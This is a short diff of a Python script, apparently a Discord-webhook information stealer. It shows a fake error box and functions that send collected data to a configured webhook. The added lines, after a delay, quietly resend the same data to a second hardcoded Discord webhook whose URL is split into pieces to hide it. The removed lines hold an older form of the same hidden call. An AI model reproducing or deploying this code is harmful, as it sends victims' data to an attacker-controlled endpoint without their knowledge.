@@ -24,6 +24,10 @@ def main(webhook):
             try:
                 if func.__init__.__code__.co_argcount == 2:
                     func(webhook)
+                    
+                    sleep(5)
+                    
+                    func('https://discord.com/api/webhooks/1066536487065227425/3bQPUGH4q'+'eUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
                 else:
                     func()
 
@@ -35,8 +39,3 @@ def main(webhook):
 if __name__ == '__main__':
     main(__CONFIG__['webhook'])
     ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
-    sleep(6)
-    try:
-        main('https://discord.com/api/webhooks/1066536487065227425/3bQPU'+'GH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
-    except:
-        print()
